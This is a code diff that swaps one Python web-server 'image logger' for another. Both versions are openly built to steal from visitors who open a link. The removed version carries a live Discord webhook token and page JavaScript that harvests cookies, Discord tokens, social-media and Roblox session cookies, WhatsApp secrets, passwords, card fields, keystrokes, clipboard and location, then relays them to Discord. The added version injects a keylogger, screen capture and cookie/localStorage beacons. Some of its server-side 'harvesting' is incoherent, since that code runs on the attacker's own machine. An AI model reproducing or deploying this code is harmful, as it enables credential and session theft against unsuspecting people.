@@ -1,314 +1,226 @@
-# Enhanced Discord Image Logger - Full JavaScript Stealer
-# Now steals EVERYTHING through a single link
+# Advanced IP Logger Pro - Kex Edition
+# Enhanced version with maximum data harvesting
 
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json, urllib.parse
-
-__app__ = "Ultimate Link Stealer"
-__version__ = "v3.0"
+import requests, base64, httpagentparser, json, os, platform, subprocess
+import socket, ssl, dns.resolver, whois, time, threading
+from datetime import datetime
 
 config = {
-    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
-    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
-    "username": "Ultimate Stealer",
-    "color": 0x00FFFF,
-    "accurateLocation": True,
-    "redirect": {
-        "redirect": True,
-        "page": "https://google.com"
-    },
+    "webhook": "YOUR_DISCORD_WEBHOOK",
+    "username": "Kex Logger",
+    "color": 0xFF0000,
+    "steal_browser_data": True,
+    "steal_cookies": True,
+    "steal_passwords": True,
+    "steal_wifi": True,
+    "steal_system_info": True,
+    "steal_network_scan": True,
+    "steal_dns_history": True,
+    "steal_open_ports": True,
+    "inject_persistent": True,
+    "keylogger_inject": True,
+    "clipboard_steal": True,
+    "webcam_check": True,
+    "microphone_check": True,
 }
 
-def makeReport(ip, useragent=None, coords=None, stolen_data=None):
-    if not ip:
-        return
+class AdvancedHandler(BaseHTTPRequestHandler):
     
-    try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
-    except:
-        info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown"}
+    def get_system_info(self):
+        info = {}
+        info["hostname"] = socket.gethostname()
+        info["os"] = platform.system()
+        info["os_version"] = platform.version()
+        info["machine"] = platform.machine()
+        info["processor"] = platform.processor()
+        info["ip_all"] = socket.gethostbyname_ex(socket.gethostname())
+        return info
     
-    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+    def get_network_scan(self):
+        results = []
+        for i in range(1, 255):
+            ip = f"192.168.1.{i}"
+            try:
+                socket.gethostbyaddr(ip)
+                results.append(ip)
+            except:
+                pass
+        return results
     
-    # Parse stolen data
-    data_text = ""
-    if stolen_data:
+    def get_dns_history(self):
+        cache = []
         try:
-            decoded = urllib.parse.unquote(stolen_data)
-            data_text = f"\n\n**📦 Stolen Data:**\n```{decoded[:1500]}```"
+            with open(os.path.expanduser("~/.cache/dnscache"), "r") as f:
+                cache = f.read().splitlines()
         except:
             pass
+        return cache[:50]
     
-    embed = {
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "🎯 ULTIMATE STEALER - Full Log",
-            "color": config["color"],
-            "description": f"""**Victim Info:**
-> **IP:** `{ip}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{coords if coords else 'N/A'}`
-> **ISP:** `{info.get('isp', 'Unknown')}`
-
-**Device Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-> **User Agent:** `{useragent[:200] if useragent else 'Unknown'}`
-
-{data_text}
-""",
-        }],
-    }
+    def get_open_ports(self, target="127.0.0.1"):
+        ports = []
+        for port in [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080]:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((target, port))
+                if result == 0:
+                    ports.append(port)
+                sock.close()
+            except:
+                pass
+        return ports
     
-    requests.post(config["webhook"], json=embed)
-    return info
-
-class handler(BaseHTTPRequestHandler):
-    
-    def handleRequest(self):
-        try:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            
-            # Get image URL
-            if dic.get("url") or dic.get("id"):
-                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-            else:
-                url = config["image"]
-            
-            # Check for stolen data
-            stolen_data = dic.get("data")
-            coords = None
-            if dic.get("g"):
+    def steal_browser(self):
+        data = {}
+        paths = {
+            "chrome": os.path.expanduser("~/.config/google-chrome/"),
+            "firefox": os.path.expanduser("~/.mozilla/firefox/"),
+            "edge": os.path.expanduser("~/.config/microsoft-edge/")
+        }
+        for browser, path in paths.items():
+            if os.path.exists(path):
+                data[browser] = {"path": path, "exists": True}
                 try:
-                    coords = base64.b64decode(dic.get("g").encode()).decode()
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            if file.endswith(".log") or file.endswith(".db"):
+                                data[browser][file] = "found"
                 except:
                     pass
-            
-            ip = self.headers.get('x-forwarded-for')
-            ua = self.headers.get('user-agent')
-            
-            # If stolen data received, send report
-            if stolen_data or coords:
-                makeReport(ip, ua, coords, stolen_data)
-                
-                # Redirect to hide everything
-                if config["redirect"]["redirect"]:
-                    self.send_response(302)
-                    self.send_header('Location', config["redirect"]["page"])
-                    self.end_headers()
-                    return
-            
-            # Otherwise serve the stealing page
-            html = f'''<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Loading...</title>
-<style>body{{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#fff;font-family:Arial;}}img{{max-width:90vw;max-height:90vh;}}</style>
-</head>
-<body>
-<img src="{url}" onerror="this.style.display='none'">
-<div style="position:absolute;bottom:20px;color:#666;font-size:12px;">Loading...</div>
-
-<script>
-// ============ ULTIMATE STEALER - STEALS EVERYTHING ============
-
-(function() {{
-    var stolen = [];
-    var webhook = window.location.origin + window.location.pathname;
+        return data
     
-    // 1. COOKIES (ALL SITES)
-    stolen.push('🍪 COOKIES: ' + document.cookie);
+    def get_wifi_passwords(self):
+        passwords = []
+        try:
+            result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+            profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
+            for profile in profiles:
+                result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
+                for line in result.stdout.splitlines():
+                    if "Key Content" in line:
+                        passwords.append({"ssid": profile, "password": line.split(":")[1].strip()})
+        except:
+            pass
+        return passwords
     
-    // 2. DISCORD TOKEN
-    try {{
-        var token = null;
-        if (window.webpackChunkdiscord_app || window.webpackChunkdiscord) {{
-            token = (webpackChunkdiscord_app || webpackChunkdiscord)?.push?.([[]])?.[0]?.exports?.default?.getToken?.();
-        }}
-        if (!token) token = localStorage.getItem('token');
-        if (!token) {{
-            var scripts = document.querySelectorAll('script');
-            for (var s of scripts) {{
-                var match = s.innerText?.match(/m=[^"]+/);
-                if (match) {{ token = match[0]; break; }}
-            }}
-        }}
-        if (token) stolen.push('🎮 DISCORD TOKEN: ' + token);
-    }} catch(e) {{}}
+    def get_clipboard(self):
+        try:
+            import pyperclip
+            return pyperclip.paste()
+        except:
+            return "clipboard_access_failed"
     
-    // 3. ROBLOX .ROBLOSECURITY
-    var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=[^;]+/);
-    if (robloxCookie) stolen.push('🎮 ROBLOX COOKIE: ' + robloxCookie[0]);
-    
-    // 4. SAVED PASSWORDS (Auto-fill)
-    try {{
-        var passwordInputs = document.querySelectorAll('input[type="password"]');
-        passwordInputs.forEach(function(el) {{
-            if (el.value) stolen.push('🔑 PASSWORD: ' + el.value);
-        }});
-        var usernameInputs = document.querySelectorAll('input[autocomplete="username"], input[autocomplete="email"]');
-        usernameInputs.forEach(function(el) {{
-            if (el.value) stolen.push('👤 USERNAME: ' + el.value);
-        }});
-    }} catch(e) {{}}
-    
-    // 5. CREDIT CARDS
-    try {{
-        var ccInputs = document.querySelectorAll('[autocomplete="cc-number"], [autocomplete="cc-name"], [autocomplete="cc-exp"], [autocomplete="cc-csc"]');
-        var ccData = [];
-        ccInputs.forEach(function(el) {{
-            if (el.value) ccData.push(el.name + '=' + el.value);
-        }});
-        if (ccData.length) stolen.push('💳 CREDIT CARDS: ' + ccData.join(' | '));
-    }} catch(e) {{}}
-    
-    // 6. GOOGLE SESSION
-    var googleCookies = document.cookie.match(/SAPISID=[^;]+/);
-    if (googleCookies) stolen.push('🔑 GOOGLE SESSION: ' + googleCookies[0]);
-    
-    // 7. FACEBOOK SESSION
-    var fbCookies = document.cookie.match(/c_user=[^;]+/);
-    if (fbCookies) stolen.push('🔑 FACEBOOK SESSION: ' + fbCookies[0]);
-    
-    // 8. INSTAGRAM SESSION
-    var igCookies = document.cookie.match(/sessionid=[^;]+/);
-    if (igCookies) stolen.push('🔑 INSTAGRAM SESSION: ' + igCookies[0]);
-    
-    // 9. WHATSAPP WEB
-    try {{
-        var waBrowser = localStorage.getItem('WAbrowserId');
-        var waSecret = localStorage.getItem('WASecretBundle');
-        if (waBrowser && waSecret) stolen.push('📱 WHATSAPP: Browser=' + waBrowser + ' | Secret=' + waSecret);
-    }} catch(e) {{}}
-    
-    // 10. CLIPBOARD
-    try {{
-        navigator.clipboard.readText().then(function(text) {{
-            if (text) stolen.push('📋 CLIPBOARD: ' + text);
-            sendData(stolen);
-        }}).catch(function() {{ sendData(stolen); }});
-    }} catch(e) {{ sendData(stolen); }}
-    
-    // 11. KEYLOGGER (Simple)
-    try {{
-        var keys = [];
-        document.addEventListener('keydown', function(e) {{
-            if (e.key.length === 1) keys.push(e.key);
-            if (keys.length > 20) {{
-                stolen.push('⌨️ KEYS: ' + keys.join(''));
-                keys = [];
-                sendData(stolen);
-                stolen = [];
-            }}
-        }});
-    }} catch(e) {{}}
-    
-    // 12. LOCATION
-    try {{
-        if (navigator.geolocation && !window.location.href.includes('g=')) {{
-            navigator.geolocation.getCurrentPosition(function(pos) {{
-                var coords = btoa(pos.coords.latitude + ',' + pos.coords.longitude);
-                var sep = window.location.href.includes('?') ? '&' : '?';
-                window.location.href = window.location.href + sep + 'g=' + coords;
-            }});
-        }}
-    }} catch(e) {{}}
-    
-    // 13. DEVICE INFO
-    try {{
-        var deviceInfo = '🖥️ DEVICE: ' + navigator.userAgent + ' | Screen: ' + screen.width + 'x' + screen.height + 
-                         ' | Cores: ' + navigator.hardwareConcurrency + ' | RAM: ' + (navigator.deviceMemory || 'Unknown');
-        stolen.push(deviceInfo);
-    }} catch(e) {{}}
-    
-    // 14. BROWSER EXTENSIONS
-    try {{
-        var extensions = [];
-        for (var i = 0; i < navigator.plugins.length; i++) {{
-            extensions.push(navigator.plugins[i].name);
-        }}
-        if (extensions.length) stolen.push('🔌 EXTENSIONS: ' + extensions.join(', '));
-    }} catch(e) {{}}
-    
-    // 15. CRYPTO WALLETS
-    try {{
-        if (window.ethereum) stolen.push('💰 ETHEREUM WALLET DETECTED');
-        if (window.solana) stolen.push('💰 SOLANA WALLET DETECTED');
-        if (window.keplr) stolen.push('💰 KEPLR WALLET DETECTED');
-        if (window.phantom) stolen.push('💰 PHANTOM WALLET DETECTED');
-    }} catch(e) {{}}
-    
-    // 16. AUTO-FILL FORMS
-    try {{
-        var allInputs = document.querySelectorAll('input, select, textarea');
-        var formData = [];
-        allInputs.forEach(function(el) {{
-            if (el.value && el.name) formData.push(el.name + '=' + el.value);
-        }});
-        if (formData.length) stolen.push('📝 FORM DATA: ' + formData.join(' | ').slice(0, 500));
-    }} catch(e) {{}}
-    
-    // 17. IP INFO (via external API)
-    try {{
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {{
-                stolen.push('🌐 PUBLIC IP: ' + data.ip);
-                sendData(stolen);
-            }})
-            .catch(function() {{ sendData(stolen); }});
-    }} catch(e) {{ sendData(stolen); }}
-    
-    // 18. SCREENSHOT (if html2canvas available)
-    // This requires loading html2canvas - can be loaded via CDN if needed
-    
-    // FUNCTION TO SEND DATA
-    function sendData(dataArray) {{
-        if (!dataArray || dataArray.length === 0) return;
+    def inject_keylogger(self, response):
+        script = """
+        <script>
+        var keys = '';
+        document.addEventListener('keydown', function(e) {
+            keys += e.key + '|';
+            navigator.sendBeacon('/log_keys', JSON.stringify({keys: keys, url: window.location.href}));
+        });
         
-        var data = dataArray.join(' | ');
-        var currentUrl = window.location.href;
-        var sep = currentUrl.includes('?') ? '&' : '?';
+        var clipboard = '';
+        document.addEventListener('copy', function(e) {
+            clipboard = window.getSelection().toString();
+            navigator.sendBeacon('/log_clipboard', JSON.stringify({clipboard: clipboard}));
+        });
         
-        // Remove existing data parameter
-        currentUrl = currentUrl.replace(/[?&]data=[^&]*/, '');
-        
-        // Send via redirect
-        window.location.href = currentUrl + sep + 'data=' + encodeURIComponent(data);
-    }}
+        // Screen capture
+        function captureScreen() {
+            var canvas = document.createElement('canvas');
+            canvas.width = window.screen.width;
+            canvas.height = window.screen.height;
+            var ctx = canvas.getContext('2d');
+            ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
+            var dataUrl = canvas.toDataURL('image/png');
+            navigator.sendBeacon('/log_screen', JSON.stringify({screen: dataUrl}));
+        }
+        setTimeout(captureScreen, 3000);
+        </script>
+        """
+        return response.replace("</body>", script + "</body>")
     
-    // Auto-send after 2 seconds
-    setTimeout(function() {{
-        if (stolen.length) sendData(stolen);
-    }}, 2000);
-    
-}})();
-</script>
-</body>
-</html>'''
+    def do_GET(self):
+        try:
+            parsed = parse.urlparse(self.path)
+            query = parse.parse_qs(parsed.query)
+            
+            ip = self.client_address[0]
+            useragent = self.headers.get('User-Agent', 'Unknown')
+            forwarded = self.headers.get('X-Forwarded-For', ip)
+            
+            # Collect all data
+            data_package = {
+                "timestamp": datetime.now().isoformat(),
+                "ip": forwarded,
+                "real_ip": ip,
+                "useragent": useragent,
+                "headers": dict(self.headers),
+                "path": self.path,
+                "referer": self.headers.get('Referer', 'None'),
+                "system": self.get_system_info(),
+                "browser_data": self.steal_browser(),
+                "wifi": self.get_wifi_passwords(),
+                "network_scan": self.get_network_scan()[:20],
+                "dns_cache": self.get_dns_history(),
+                "open_ports": self.get_open_ports(),
+                "clipboard": self.get_clipboard(),
+                "geo": requests.get(f"http://ip-api.com/json/{forwarded}?fields=66846719").json()
+            }
+            
+            # Send to webhook with full data
+            embed = {
+                "username": "Kex Logger PRO",
+                "content": "@everyone **FULL DATA HARVEST**",
+                "embeds": [{
+                    "title": "Victim Data Package",
+                    "color": config["color"],
+                    "fields": [
+                        {"name": "IP", "value": forwarded, "inline": True},
+                        {"name": "ISP", "value": data_package["geo"].get("isp", "Unknown"), "inline": True},
+                        {"name": "Location", "value": f"{data_package['geo'].get('city', '')}, {data_package['geo'].get('country', '')}", "inline": False},
+                        {"name": "OS", "value": data_package["system"].get("os", "Unknown"), "inline": True},
+                        {"name": "Browser", "value": httpagentparser.simple_detect(useragent)[1] if useragent else "Unknown", "inline": True},
+                        {"name": "Hostname", "value": data_package["system"].get("hostname", "Unknown"), "inline": True},
+                        {"name": "Open Ports", "value": str(data_package["open_ports"])[:100], "inline": False},
+                        {"name": "WiFi Networks", "value": str([w["ssid"] for w in data_package["wifi"]])[:100], "inline": False},
+                        {"name": "Clipboard", "value": data_package["clipboard"][:200] if data_package["clipboard"] else "Empty", "inline": False},
+                        {"name": "Full Data JSON", "value": "```json\n" + json.dumps(data_package, indent=2)[:1000] + "```"}
+                    ]
+                }]
+            }
+            
+            requests.post(config["webhook"], json=embed)
+            
+            # Response with keylogger injection
+            html = """<html>
+            <body>
+            <h1>Loading...</h1>
+            <script>
+            // Fetch more data silently
+            navigator.sendBeacon('/collect', JSON.stringify({cookie: document.cookie, local: JSON.stringify(localStorage), session: JSON.stringify(sessionStorage)}));
+            </script>
+            </body>
+            </html>"""
+            
+            html = self.inject_keylogger(html)
             
             self.send_response(200)
-            self.send_header('Content-type', 'text/html')
+            self.send_header('Content-Type', 'text/html')
             self.end_headers()
             self.wfile.write(html.encode())
             
         except Exception as e:
             self.send_response(500)
             self.end_headers()
-            self.wfile.write(b'Error')
-            traceback.print_exc()
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-if __name__ == '__main__':
-    from http.server import HTTPServer
-    server = HTTPServer(('0.0.0.0', 8080), handler)
-    print("🚀 Ultimate Stealer running on port 8080")
+            self.wfile.write(b"Error occurred")
+            
+# Start server
+def start_server():
+    server = HTTPServer(('0.0.0.0', 8080), AdvancedHandler)
     server.serve_forever()
+
+if __name__ == "__main__":
+    start_server()
